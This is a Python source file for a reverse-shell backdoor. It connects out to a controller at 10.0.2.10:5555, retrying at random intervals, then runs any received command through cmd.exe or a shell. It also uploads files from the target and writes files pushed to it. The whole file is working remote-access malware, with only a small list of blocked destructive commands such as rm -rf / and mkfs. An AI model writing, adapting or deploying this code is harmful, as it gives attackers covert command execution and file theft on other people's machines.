import socket
import time
import subprocess
import json
import os
import random
import sys

def reliable_send(data):
    """Send data reliably using JSON serialization"""
    try:
        jsondata = json.dumps(data)
        s.send(jsondata.encode())
    except Exception as e:
        print(f"[-] Error sending data: {str(e)}")

def reliable_recv():
    """Receive data reliably, handling partial JSON chunks"""
    data = ""
    while True:
        try:
            chunk = s.recv(4096).decode('utf-8', errors='ignore')
            if not chunk:
                return None
            data += chunk
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                continue
        except ConnectionResetError:
            return None
        except Exception as e:
            return None

def upload_file(file_name):
    """Upload a file from target to server"""
    try:
        if not os.path.exists(file_name):
            reliable_send(f"[-] File '{file_name}' not found!")
            return
            
        with open(file_name, 'rb') as f:
            s.send(f.read())
        reliable_send(f"[+] File '{file_name}' uploaded successfully")
    except Exception as e:
        reliable_send(f"[-] Error uploading file: {str(e)}")

def download_file(file_name):
    """Download a file from server to target"""
    try:
        with open(file_name, 'wb') as f:
            s.settimeout(1)
            while True:
                try:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except socket.timeout:
                    break
            s.settimeout(None)
        reliable_send(f"[+] File '{file_name}' downloaded successfully")
    except Exception as e:
        reliable_send(f"[-] Error downloading file: {str(e)}")

def execute_command(command):
    """Execute system command securely with timeout"""
    try:
        # Security: Block dangerous commands
        dangerous = ['format', 'del /f', 'rm -rf /', 'dd if=', 'mkfs']
        for d in dangerous:
            if d in command.lower():
                return f"[-] Command '{d}' is blocked"
        
        # Windows commands
        if os.name == 'nt':
            process = subprocess.Popen(
                ['cmd.exe', '/c', command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
        
        try:
            stdout, stderr = process.communicate(timeout=30)
            result = stdout + stderr
            if not result.strip():
                result = "[+] Command executed successfully (no output)"
            return result
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            result = stdout + stderr
            if result.strip():
                return f"[-] Command timed out\nPartial output:\n{result}"
            return "[-] Command timed out (no output)"
            
    except Exception as e:
        return f"[-] Error executing command: {str(e)}"

def handle_clear():
    """Clear the terminal screen"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        return "[+] Screen cleared"
    except Exception as e:
        return f"[-] Error: {str(e)}"

def shell():
    """Main shell loop"""
    while True:
        try:
            command = reliable_recv()
            if command is None:
                break
            
            if command == 'quit':
                break
            
            elif command == 'clear':
                handle_clear()
                reliable_send("[+] Screen cleared")
                
            elif command[:3] == 'cd ':
                try:
                    # Windows için path'i düzgün parse et
                    path = command[3:].strip()
                    # Eğer path tırnak içinde ise temizle
                    if path.startswith('"') and path.endswith('"'):
                        path = path[1:-1]
                    os.chdir(path)
                    reliable_send(f"[+] Changed directory to: {os.getcwd()}")
                except FileNotFoundError:
                    reliable_send(f"[-] Directory not found: {path}")
                except Exception as e:
                    reliable_send(f"[-] Error: {str(e)}")
                    
            elif command[:8] == 'download':
                upload_file(command[9:])
                
            elif command[:6] == 'upload':
                download_file(command[7:])
                
            else:
                result = execute_command(command)
                # Büyük çıktıları parçala
                if len(result) > 8000:
                    chunk_size = 7000
                    for i in range(0, len(result), chunk_size):
                        reliable_send(result[i:i+chunk_size])
                    reliable_send("[END]")
                else:
                    reliable_send(result)
                
        except ConnectionResetError:
            break
        except KeyboardInterrupt:
            break
        except Exception as e:
            try:
                reliable_send(f"[-] Shell error: {str(e)}")
            except:
                break

def connect_with_retry():
    """Connect to server with retry logic"""
    global s
    
    while True:
        try:
            delay = 20 + random.randint(0, 30)
            print(f"[+] Next connection attempt in {delay} seconds...")
            time.sleep(delay)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            
            s.connect(('10.0.2.10', 5555))
            s.settimeout(None)
            
            print("[+] Connected to server!")
            shell()
            
            s.close()
            break
            
        except Exception as e:
            print(f"[-] Connection error: {str(e)}")
            continue

if __name__ == "__main__":
    print("[+] Backdoor starting...")
    s = None
    try:
        connect_with_retry()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    finally:
        if s:
            try:
                s.close()
            except:
                pass
        print("[+] Backdoor terminated")